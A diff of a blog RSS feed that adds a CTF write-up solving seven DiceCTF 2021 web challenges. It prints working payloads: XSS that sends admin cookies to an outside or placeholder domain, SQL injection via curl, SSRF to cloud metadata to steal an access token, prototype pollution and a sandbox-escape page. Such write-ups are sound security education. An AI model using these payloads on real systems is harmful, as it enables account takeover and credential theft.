@@ -5,12 +5,436 @@
     <link>https://ahmed-belkahla.me/</link>
       <atom:link href="https://ahmed-belkahla.me/index.xml" rel="self" type="application/rss+xml" />
     <description>Empire Total - Securinets Quals20</description>
-    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Ahmed Belkahla, 2020</copyright><lastBuildDate>Sat, 21 Mar 2020 00:00:00 +0000</lastBuildDate>
+    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Ahmed Belkahla, 2021</copyright><lastBuildDate>Sat, 21 Mar 2020 00:00:00 +0000</lastBuildDate>
     <image>
       <url>https://ahmed-belkahla.me/img/quals.jpg</url>
       <title>Empire Total - Securinets Quals20</title>
       <link>https://ahmed-belkahla.me/</link>
     </image>
+    
+    <item>
+      <title>DiceCTF Web Writeups - Client Side Chaining And JS Attacks</title>
+      <link>https://ahmed-belkahla.me/post/dice_ctf_web_writeups/</link>
+      <pubDate>Wed, 10 Feb 2021 22:00:00 +0000</pubDate>
+      <guid>https://ahmed-belkahla.me/post/dice_ctf_web_writeups/</guid>
+      <description>&lt;p&gt;Hello everybody , it has been a long time since I have posted a writeup :( I have been a little busy in the last period with school assignments, exams and some work (Covid has really messed up my life). After a little break I had fun participating in Dice CTF which had some great client side challenges, we will explore them in details in this article , we assume you have a background about basic client side attacks, so let&amp;rsquo;s start our ride now. (Challenges are still up, you can try them &lt;strong&gt;
+&lt;a href=&#34;https://ctf.dicega.ng/challs&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt; or follow along with me)&lt;/p&gt;
+&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
+&lt;p&gt;1- Client Side chaining attacks&lt;/p&gt;
+&lt;p&gt;2- Babier CSP&lt;/p&gt;
+&lt;p&gt;3- Missing Flavortext&lt;/p&gt;
+&lt;p&gt;4- Web Utils&lt;/p&gt;
+&lt;p&gt;5- Build a Panel&lt;/p&gt;
+&lt;p&gt;6- Web IDE&lt;/p&gt;
+&lt;p&gt;7- Watermark as a Service&lt;/p&gt;
+&lt;p&gt;8- Build a Better Panel&lt;/p&gt;
+&lt;h2 id=&#34;client-side-chaining-attacks&#34;&gt;Client Side Chaining Attacks&lt;/h2&gt;
+&lt;p&gt;Generally client side bugs alone have a low impact , but with the great research going on it&amp;rsquo;s possible to chain multiple bugs together and get a higher impact, a simple reflected XSS can now lead to account takeover if it&amp;rsquo;s chained with some other bugs. The last CTFs have been focusing on this techniques and DiceCTF was not an exception , it had great tasks that required chaining multiple bugs to get the flag.&lt;/p&gt;
+&lt;h2 id=&#34;babier-csp&#34;&gt;Babier CSP&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/4p9Tvbc.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The website is simple and has an obvious reflected XSS but it was protected with a strict CSP (Content Security Policy). Firstly I didn&amp;rsquo;t notice the source code that was provided with the task so I tried to find a way to bypass the CSP&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;default-src none; script-src &#39;nonce-g+ojjmb9xLfE+3j9PsP/Ig==&#39;;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/sZpg1oc.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;In fact, if we focus a little bit you can see that none is not situated between two quotation marks so it will be interpreted as the hostname &amp;ldquo;none&amp;rdquo; , I played a little bit with this but i reached a dead end :&#39;( Fortunately when I saw the source code it was obvious that the nonce is only generated once so we can reuse it.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const express = require(&#39;express&#39;);
+const crypto = require(&amp;quot;crypto&amp;quot;);
+const config = require(&amp;quot;./config.js&amp;quot;);
+const app = express()
+const port = process.env.port || 3000;
+
+const SECRET = config.secret;
+const NONCE = crypto.randomBytes(16).toString(&#39;base64&#39;);
+
+const template = name =&amp;gt; `
+&amp;lt;html&amp;gt;
+
+${name === &#39;&#39; ? &#39;&#39;: `&amp;lt;h1&amp;gt;${name}&amp;lt;/h1&amp;gt;`}
+&amp;lt;a href=&#39;#&#39; id=elem&amp;gt;View Fruit&amp;lt;/a&amp;gt;
+
+&amp;lt;script nonce=${NONCE}&amp;gt;
+elem.onclick = () =&amp;gt; {
+  location = &amp;quot;/?name=&amp;quot; + encodeURIComponent([&amp;quot;apple&amp;quot;, &amp;quot;orange&amp;quot;, &amp;quot;pineapple&amp;quot;, &amp;quot;pear&amp;quot;][Math.floor(4 * Math.random())]);
+}
+&amp;lt;/script&amp;gt;
+
+&amp;lt;/html&amp;gt;
+`;
+
+app.get(&#39;/&#39;, (req, res) =&amp;gt; {
+  res.setHeader(&amp;quot;Content-Security-Policy&amp;quot;, `default-src none; script-src &#39;nonce-${NONCE}&#39;;`);
+  res.send(template(req.query.name || &amp;quot;&amp;quot;));
+})
+
+app.use(&#39;/&#39; + SECRET, express.static(__dirname + &amp;quot;/secret&amp;quot;));
+
+app.listen(port, () =&amp;gt; {
+  console.log(`Example app listening at http://localhost:${port}`)
+})
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So Our last payload that we will send to the admin bot is:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;https://babier-csp.dicec.tf/?name=%3Cscript%20nonce=%22LRGWAXOY98Es0zz0QOVmag==%22%3Edocument.location=%22https://fword.wtf/?a=%22%2Bdocument.cookie;%3C/script%3E
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;PS:&lt;/strong&gt; I used window.location because of default-src attribute in CSP so we can only use fetch for example with the hostname none.&lt;/p&gt;
+&lt;h2 id=&#34;missing-flavortext&#34;&gt;Missing Flavortext&lt;/h2&gt;
+&lt;p&gt;The website is a simple login page and we have the source code&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.static(&#39;static&#39;));
+
+// login route
+app.post(&#39;/login&#39;, (req, res) =&amp;gt; {
+  if (!req.body.username || !req.body.password) {
+    return res.redirect(&#39;/&#39;);
+  }
+
+  if ([req.body.username, req.body.password].some(v =&amp;gt; v.includes(&#39;\&#39;&#39;))) {
+    return res.redirect(&#39;/&#39;);
+  }
+
+  // see if user is in database
+  const query = `SELECT id FROM users WHERE
+    username = &#39;${req.body.username}&#39; AND
+    password = &#39;${req.body.password}&#39;
+  `;
+
+  let id;
+  try { id = db.prepare(query).get()?.id } catch {
+    return res.redirect(&#39;/&#39;);
+  }
+
+  // correct login
+  if (id) return res.sendFile(&#39;flag.html&#39;, { root: __dirname });
+
+  // incorrect login
+  return res.redirect(&#39;/&#39;);
+});
+
+app.listen(3000);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can easily notice the sql injection in this piece of code&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  const query = `SELECT id FROM users WHERE
+    username = &#39;${req.body.username}&#39; AND
+    password = &#39;${req.body.password}&#39;
+  `;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;But there is a simple filter that is blacklisting the quotation mark:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  if ([req.body.username, req.body.password].some(v =&amp;gt; v.includes(&#39;\&#39;&#39;))) {
+    return res.redirect(&#39;/&#39;);
+  }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let&amp;rsquo;s focus on bypassing the filter , I encountered this type of check algorithms a lot in previous CTFs so after seeing &lt;code&gt; app.use(bodyParser.urlencoded({ extended: true }));&lt;/code&gt; I knew that we will try to use arrays to trick the filter. When the extended attribute of bodyparser is set to True we can use any type in the request parameters (When it&amp;rsquo;s set to false we can only use strings or arrays). &amp;ldquo;Includes&amp;rdquo; function can be used for arrays and strings so if we pass the password as an array we will be able to bypass the filter. (I covered this technique in more details in the following &lt;strong&gt;
+&lt;a href=&#34;https://ahmed-belkahla.me/post/angstromctf20/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;writeup&lt;/a&gt;&lt;/strong&gt;) . Finally running the following command we will get our flag:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl -d &amp;quot;username=admin&amp;amp;password[]=&#39;or 1=1 -- -&amp;quot; https://missing-flavortext.dicec.tf/login
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/vjRONbL.png&#34; alt=&#34;FLAG&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web-utils&#34;&gt;Web Utils&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/U8ZpCk8.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We have a website that have link sortener and pastebin functionalities, our goal is to steal the admin cookies so the first thing I thinked about is finding an XSS.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/qsD2mmS.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After exploring the existing fields in the website there was no obvious XSS, while I was exploring the source code I had the idea to try shortening a url of the following form &lt;code&gt;javascript:alert(1);&lt;/code&gt; but there was a regex expression filtering the url format.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;module.exports = async (fastify) =&amp;gt; {
+  fastify.post(&#39;createLink&#39;, {
+    handler: (req, rep) =&amp;gt; {
+      const uid = database.generateUid(8);
+      const regex = new RegExp(&#39;^https?://&#39;);
+      if (! regex.test(req.body.data))
+        return rep
+          .code(200)
+          .header(&#39;Content-Type&#39;, &#39;application/json; charset=utf-8&#39;)
+          .send({
+            statusCode: 200,
+            error: &#39;Invalid URL&#39;
+          });
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;But focusing more on the source code we can notice this piece of code in the CreatePaste endpoint :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  fastify.post(&#39;createPaste&#39;, {
+    handler: (req, rep) =&amp;gt; {
+      const uid = database.generateUid(8);
+      database.addData({ type: &#39;paste&#39;, ...req.body, uid });
+      rep
+        .code(200)
+        .header(&#39;Content-Type&#39;, &#39;application/json; charset=utf-8&#39;)
+        .send({
+          statusCode: 200,
+          data: uid
+        });
+    },
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The following line is pretty juicy&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;database.addData({ type: &#39;paste&#39;, ...req.body, uid });
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Any parameter we will send in the request&amp;rsquo;s body will be passed to the addData function so we can change the type of the added data to &amp;ldquo;link&amp;rdquo; and get rid of the regex expression in the CreateLink endpoint, so the payload will be :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl --header &amp;quot;Content-Type: application/json&amp;quot; \
+  --request POST \
+  --data &#39;{&amp;quot;type&amp;quot;:&amp;quot;link&amp;quot;,&amp;quot;data&amp;quot;:&amp;quot;javascript:fetch(\&amp;quot;https://&amp;lt;Domain&amp;gt;?a=\&amp;quot;+document.cookie);&amp;quot;}&#39; https://web-utils.dicec.tf/api/createPaste
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/SM1F62T.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After that we send the paste link &lt;code&gt;https://web-utils.dicec.tf/view/HW9BHr0a&lt;/code&gt; to the admin bot  and we get the cookie in our controlled web server (You can use webhook.site for example).&lt;/p&gt;
+&lt;h2 id=&#34;build-a-panel&#34;&gt;Build a Panel&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/Fwqh7PY.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The website is simple , you can create a panel and add some widgets in it . After analysing the provided source code we can notice that the flag is in the database.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;db.run(query);
+query = `CREATE TABLE IF NOT EXISTS flag (
+    flag TEXT
+)`;
+db.run(query, [], (err) =&amp;gt; {
+    if(!err){
+        let innerQuery = `INSERT INTO flag SELECT &#39;dice{fake_flag}&#39;`;
+        db.run(innerQuery);
+    }else{
+        console.error(&#39;Could not create flag table&#39;);
+    }
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The following piece code looks interesting , we can see the SQL injection vulnerability but unfortunately this endpoint is only accessible by the admin&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;app.get(&#39;/admin/debug/add_widget&#39;, async (req, res) =&amp;gt; {
+    const cookies = req.cookies;
+    const queryParams = req.query;
+
+    if(cookies[&#39;token&#39;] &amp;amp;&amp;amp; cookies[&#39;token&#39;] == secret_token){
+        query = `INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES (&#39;${queryParams[&#39;panelid&#39;]}&#39;, &#39;${queryParams[&#39;widgetname&#39;]}&#39;, &#39;${queryParams[&#39;widgetdata&#39;]}&#39;);`;
+        db.run(query, (err) =&amp;gt; {
+            if(err){
+                console.log(err);
+                res.send(&#39;something went wrong&#39;);
+            }else{
+                res.send(&#39;success!&#39;);
+            }
+        });
+    }else{
+        res.redirect(&#39;/&#39;);
+    }
+});
+
+app.listen(31337, () =&amp;gt; {
+    console.log(&#39;express listening on 31337&#39;)
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So what if we send the link having our SQL injection payload to the admin so it will be executed as the admin and we can bypass the following check&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;if(cookies[&#39;token&#39;] &amp;amp;&amp;amp; cookies[&#39;token&#39;] == secret_token)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;For the SQL injection part we will use the subqueries to create a widget in our panel with a title having the flag , our final payload that we will send to the admin bot is :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=&amp;lt;Your-Panel-ID&amp;gt;&#39;, (select flag from flag limit 1), &#39;1&#39;);--&amp;amp;widgetname=a&amp;amp;widgetdata=a
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And Bingo our beloved flag is there :D&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/c51VGbR.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web-ide&#34;&gt;Web IDE&lt;/h2&gt;
+&lt;p&gt;The website is a simple IDE to run javascript code in a sandboxed environment, we have the source code as usual .&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/z5jCnly.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After analysing the code we can notice that the flag is in the admin cookie so obviously our goal will be to steal it&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  case &#39;admin&#39;:
+    if (password === adminPassword)
+      return res.cookie(&#39;token&#39;, `dice{${process.env.FLAG}}`, {
+        path: &#39;/ide&#39;,
+        sameSite: &#39;none&#39;,
+        secure: true
+      }).redirect(&#39;/ide/&#39;);
+    break;
+  }
+  res.status(401).end();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The restrictions that are set up are the following:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;app.use(&#39;/&#39;, (req, res, next) =&amp;gt; {
+  res.setHeader(&#39;X-Frame-Options&#39;, &#39;DENY&#39;);
+  return next();
+});
+// sandbox the sandbox
+app.use(&#39;/sandbox.html&#39;, (req, res, next) =&amp;gt; {
+  res.setHeader(&#39;Content-Security-Policy&#39;, &#39;frame-src \&#39;none\&#39;&#39;);
+  // we have to allow this for obvious reasons
+  res.removeHeader(&#39;X-Frame-Options&#39;);
+  return next();
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I tried to think about a possible scenario in order to achieve xss, the first thing was to try to bypass the sandbox so let&amp;rsquo;s take a look at its code in sandbox.js:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  const safeEval = (d) =&amp;gt; (function (data) {
+    with (new Proxy(window, {
+      get: (t, p) =&amp;gt; {
+        if (p === &#39;console&#39;) return { log };
+        if (p === &#39;eval&#39;) return window.eval;
+        return undefined;
+      }
+    })) {
+      eval(data);
+    }
+  }).call(Object.create(null), d);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The page is listening for a postmessage , once received it execute safeEval function that is acting as a proxy, we can see that entering eval will return window.eval so what about using &lt;strong&gt;eval&amp;rsquo;s constructor&lt;/strong&gt; to execute our js code freely: &lt;code&gt;eval.constructor(&amp;quot;console.log(1);&amp;quot;)()&lt;/code&gt; will print 1 in the console so our code is executed. We need now to get the cookie from /ide path since the admin cookie&amp;rsquo;s path is set like the following&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{
+      path: &#39;/ide&#39;,
+      sameSite: &#39;none&#39;,
+      secure: true
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;For this i used window.open in order to open &lt;a href=&#34;https://web-ide.dicec.tf/ide/&#34;&gt;https://web-ide.dicec.tf/ide/&lt;/a&gt; and access the dom from the window reference , this is only possible because we are not violating the same origin policy and opening the window from the same origin .
+Let&amp;rsquo;s wrap the things up now, we will create a webpage that when the admin visits it, we will send a postmessage to the sandbox ( that&amp;rsquo;s why you have to check the origin when you are using postmessages ) and open a window of &lt;a href=&#34;https://web-ide.dicec.tf/ide/&#34;&gt;https://web-ide.dicec.tf/ide/&lt;/a&gt; and send the cookie to our controlled website. The final payload code :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;
+    &amp;lt;title&amp;gt;PoC&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;iframe id=&amp;quot;vuln&amp;quot; src=&amp;quot;https://web-ide.dicec.tf/sandbox.html&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;
+&amp;lt;script&amp;gt;
+setTimeout(
+()=&amp;gt;{document.getElementById(&amp;quot;vuln&amp;quot;).contentWindow.postMessage(&amp;quot;eval.constructor(\&amp;quot;var w=window.open(&#39;https://web-ide.dicec.tf/ide/&#39;);setTimeout(()=&amp;gt;{window.location=&#39;https://&amp;lt;Your-Domain&amp;gt;?a=&#39;+btoa(w.document.cookie);},2000);\&amp;quot;)();&amp;quot;,&amp;quot;*&amp;quot;)}
+,2000);
+&amp;lt;/script&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We only have to host this page on our server and send the link to the admin bot . This was an unintended solution , the intended one is abusing service workers and navigator.sendBeacon in order to steal the cookie , you can check more details &lt;strong&gt;
+&lt;a href=&#34;https://discord.com/channels/805956008665022475/808122408019165204/808143656946368512&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt; .&lt;/p&gt;
+&lt;p&gt;I enjoyed this task the most and it required me some time that&amp;rsquo;s why i solved it after the end of the CTF but still learned a lot from it.&lt;/p&gt;
+&lt;h2 id=&#34;watermark-as-a-service&#34;&gt;Watermark as a Service&lt;/h2&gt;
+&lt;p&gt;Unfortunately, I didn&amp;rsquo;t have the chance to take a look at this task while the CTF was running but it was a fun easy task. We have a website that visits the link we enter and takes a screenshot of the website.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/Qo6chyi.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Most of you are thinking now of SSRF attack but there are some strict filters restricting us from using usual payloads and DNS rebinding tricks.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  let urlObj;
+  try {
+    urlObj = new URL(url);
+  } catch {
+    res.sendStatus(400);
+    return;
+  }
+
+  const hostname = urlObj?.hostname;
+
+  if (!hostname || ip.isPrivate(hostname)) {
+    res.sendStatus(400);
+    return;
+  }
+
+  if (BLOCKED_HOSTS.some((blockedHost) =&amp;gt; hostname.includes(blockedHost))) {
+    res.sendStatus(400);
+    return;
+  }
+
+  const protocol = urlObj?.protocol;
+  if (
+    !protocol ||
+    !ALLOWED_PROTOCOLS.some((allowedProtocol) =&amp;gt;
+      protocol.includes(allowedProtocol)
+    )
+  ) {
+    res.sendStatus(400);
+    return;
+  }
+
+  let addresses
+  try {
+    addresses = await resolve4(hostname);
+  } catch {
+    res.sendStatus(400);
+    return;
+  }
+
+  if (addresses.includes(&amp;quot;169.254.169.254&amp;quot;)) {
+    res.sendStatus(400);
+    return;
+  }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Our goal is to access google cloud metadata in order to get the access token and explore their cloud infrastructure .
+Analysing the source code, we can figure that the website is using puppeteer which is a headless chrome browser so we can host a normal static page that has a simple &lt;code&gt;js window.location=&amp;quot;http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token&amp;quot;;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;tbh I didn&amp;rsquo;t try this solution, I have just developed a simple webapp that returns a 302 status code redirect to Google Cloud internal metadata, this is the source code:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+header(&#39;Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token&#39;, true, 301);
+exit;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I like tasks that don&amp;rsquo;t need a lot of code xD You can also simply use an url shortener like cuttly or bit.ly. We have the following result after redirecting it to ``&lt;a href=&#34;http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true%60%60%60&#34;&gt;http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true```&lt;/a&gt;.
+Notice that we are using the beta service of metadata endpoint because it doesn&amp;rsquo;t require any additional headers to setup.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/jVhKZIM.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;If you focus on the results there is a docker image in &lt;code&gt;https://gcr.io/dicegang-waas/waas&lt;/code&gt; so let&amp;rsquo;s grab the google cloud access token and try to run the docker image , we will redirect it to the following url now&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token &lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Bingo we have the access token now&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/FcF5jWo.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I was really a little bit lazy to use an ocr tool and copy the access token from the screenshot x) All you have to do now is to run the following commands (
+&lt;a href=&#34;https://cloud.google.com/container-registry/docs/advanced-authentication?hl=fr#token&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Ref&lt;/a&gt;):&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;docker login -u oauth2accesstoken -p &amp;quot;&amp;lt;Access-Token&amp;gt;&amp;quot; https://gcr.io/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;docker pull gcr.io/dicegang-waas/waas
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And finally running the image will give you the flag&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;docker run -it gcr.io/dicegang-waas/waas
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Fun Fact:&lt;/strong&gt; We used a similar technique to break into a previous CTF infrastructure, if you are eager to know more you can read this &lt;strong&gt;
+&lt;a href=&#34;https://twitter.com/FwordTeam/status/1340988591787401216&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;tweet&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;build-a-better-panel&#34;&gt;Build a Better Panel&lt;/h2&gt;
+&lt;p&gt;This task was the same as Build a Panel but the admin bot was restricted to visit only the websites matching this regex &lt;code&gt;^https:\/\/build-a-better-panel\.dicec\.tf\/create\?[0-9a-z\-\=]+$&lt;/code&gt; so we can&amp;rsquo;t send directly the url having the SQL injection payload, we need to find a client side bug and chain it in order to achieve our goal.
+I started exploring the client side code and the following snippet seemed suspicious:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const mergableTypes = [&#39;boolean&#39;, &#39;string&#39;, &#39;number&#39;, &#39;bigint&#39;, &#39;symbol&#39;, &#39;undefined&#39;];
+
+const safeDeepMerge = (target, source) =&amp;gt; {
+    for (const key in source) {
+        if(!mergableTypes.includes(typeof source[key]) &amp;amp;&amp;amp; !mergableTypes.includes(typeof target[key])){
+            if(key !== &#39;__proto__&#39;){
+                safeDeepMerge(target[key], source[key]);
+            }
+        }else{
+            target[key] = source[key];
+        }
+    }
+}
+
+const displayWidgets = async () =&amp;gt; {
+    const userWidgets = await (await fetch(&#39;/panel/widgets&#39;, {method: &#39;post&#39;, credentials: &#39;same-origin&#39;})).json();
+    let toDisplayWidgets = {&#39;welcome back to build a panel!&#39;: {&#39;type&#39;: &#39;welcome&#39;}};
+
+    safeDeepMerge(toDisplayWidgets, userWidgets);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;There is an obvious prototype pollution vulnerability but we need to bypass the filter of &amp;ldquo;__proto__&amp;rdquo; , fortunately we are talking about javascript here where everything is possible :D&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/y74Mw1v.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;a.__proto__&lt;/strong&gt; is similar to &lt;strong&gt;a.constructor.prototype&lt;/strong&gt; (a is a JS object) , userWidgets is fetched from &lt;strong&gt;/panel/widgets&lt;/strong&gt; and we can control the data passed to an object. Let&amp;rsquo;s check the part responsible of returning the widgets in the backend&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;app.post(&#39;/panel/widgets&#39;, (req, res) =&amp;gt; {
+    const cookies = req.cookies;
+
+    if(cookies[&#39;panelId&#39;]){
+        const panelId = cookies[&#39;panelId&#39;];
+
+        query = `SELECT widgetname, widgetdata FROM widgets WHERE panelid = ?`;
+        db.all(query, [panelId], (err, rows) =&amp;gt; {
+            if(!err){
+                let panelWidgets = {};
+                for(let row of rows){
+                    try{
+                        panelWidgets[row[&#39;widgetname&#39;]] = JSON.parse(row[&#39;widgetdata&#39;]);
+                    }catch{
+                        
+                    }
+                }
+                res.json(panelWidgets);
+            }else{
+                res.send(&#39;something went wrong&#39;);
+            }
+        });
+    }
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The following line is the most juicy:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;panelWidgets[row[&#39;widgetname&#39;]] = JSON.parse(row[&#39;widgetdata&#39;]);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This screenshot can resume what will happen:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/4jQJ5SI.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now we have to figure out what to do with the prototype pollution and use it to achieve an XSS or somehow send a request to the endpoint vulnerable to SQL Injection (XSS is pretty hard because there is a strict CSP). After searching a little bit I found the following 
+&lt;a href=&#34;https://github.com/BlackFan/client-side-prototype-pollution&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;github repo&lt;/a&gt; holding several gadgets to use. The website is using embedly and I found the following gadget to achieve XSS ( &lt;strong&gt;
+&lt;a href=&#34;https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/embedly.md&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Gadget&lt;/a&gt;&lt;/strong&gt; ) but as we said with the used CSP it&amp;rsquo;s nearly impossible to execute JS code .&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;default-src &#39;none&#39;; script-src &#39;self&#39; http://cdn.embedly.com/; style-src &#39;self&#39; http://cdn.embedly.com/; connect-src &#39;self&#39; https://www.reddit.com/comments/;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After the end of the CTF I discovered from the discord server of the CTF that there was another gadget permitting us to set any attribute of an iframe , so we can set the srcdoc attribute to redirect the admin to the endpoint vulnerable to SQL injection, our final payload that we will send to create a widget is :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{&amp;quot;widgetName&amp;quot;:&amp;quot;constructor&amp;quot;,&amp;quot;widgetData&amp;quot;:&amp;quot;{\&amp;quot;prototype\&amp;quot;:{\&amp;quot;srcdoc\&amp;quot;:\&amp;quot;&amp;lt;script src=\\\&amp;quot;https://build-a-better-panel.dicec.tf/admin/debug/add_widget?panelid=kahlaa%27%2C%20%28select%20flag%20from%20flag%20limit%201%29%2C%20%271%27%29%3B--&amp;amp;widgetname=1&amp;amp;widgetdata=1\\\&amp;quot; &amp;gt;&amp;lt;/script&amp;gt;\&amp;quot;}}&amp;quot;}
+
+&lt;/code&gt;&lt;/pre&gt;
